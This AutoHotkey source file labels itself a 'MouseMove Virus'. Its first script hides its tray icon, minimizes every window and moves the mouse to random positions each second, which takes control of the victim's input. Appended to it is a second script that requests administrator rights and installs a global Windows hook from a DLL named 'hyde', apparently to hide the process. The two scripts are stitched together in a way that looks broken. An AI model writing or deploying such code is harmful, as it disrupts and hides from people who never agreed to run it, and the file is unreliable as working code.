/*
  MouseMove Virus

  Description:-
	Moves the mouse randomly to any position.
*/

#NoEnv
#SingleInstance Force
#Persistent
#NoTrayIcon

SetBatchLines -1 ; For Speed

CoordMode, Mouse, Screen

SysGet, WorkArea, MonitorWorkArea, 1 ; Avoid the taskbar

; Hide all windows from the action
WinMinimizeAll

; Change this to have fun as you want it...
SetTimer, MoveMouse, 1000

Return	 ;End of Auto Execute Section

MoveMouse:
	Random, Xcord , 0, %WorkAreaRight%
	Random, Ycord , 0, %WorkAreaBottom%
	MouseMove, Xcord, Ycord, 0
Return

Esc & F12::
Exitapp

#NoEnv
SetWorkingDir %A_ScriptDir%

OnExit, ExitSub

RunAsAdmin()

if ((A_Is64bitOS=1) && (A_PtrSize!=4))
	hMod := DllCall("LoadLibrary", Str, "hyde64.dll", Ptr)
else if ((A_Is32bitOS=1) && (A_PtrSize=4))
	hMod := DllCall("LoadLibrary", Str, "hyde.dll", Ptr)
Else
{
	MsgBox, Mixed Versions detected!`nOS Version and AHK Version need to be the same (x86 & AHK32 or x64 & AHK64).`n`nScript will now terminate!
	ExitApp
}

if (hMod)
{
	hHook := DllCall("SetWindowsHookEx", Int, 5, Ptr, DllCall("GetProcAddress", Ptr, hMod, AStr, "CBProc", ptr), Ptr, hMod, Ptr, 0, Ptr)
	if (!hHook)
	{
		MsgBox, SetWindowsHookEx failed!`nScript will now terminate!
		ExitApp
	}
}
else
{
	MsgBox, LoadLibrary failed!`nScript will now terminate!
	ExitApp
}

Return

Esc & F1::ExitApp

RunAsAdmin()
{
	Global 0
	IfEqual, A_IsAdmin, 1, Return 0
	
	Loop, %0%
		params .= A_Space . %A_Index%
	
	DllCall("shell32\ShellExecute" (A_IsUnicode ? "":"A"),uint,0,str,"RunAs",str,(A_IsCompiled ? A_ScriptFullPath : A_AhkPath),str,(A_IsCompiled ? "": """" . A_ScriptFullPath . """" . A_Space) params,str,A_WorkingDir,int,1)
	ExitApp
}

ExitSub:
	if (hHook)
	{
		DllCall("UnhookWindowsHookEx", Ptr, hHook)
	}
	if (hMod)
	{
		DllCall("FreeLibrary", Ptr, hMod)
	}
ExitApp
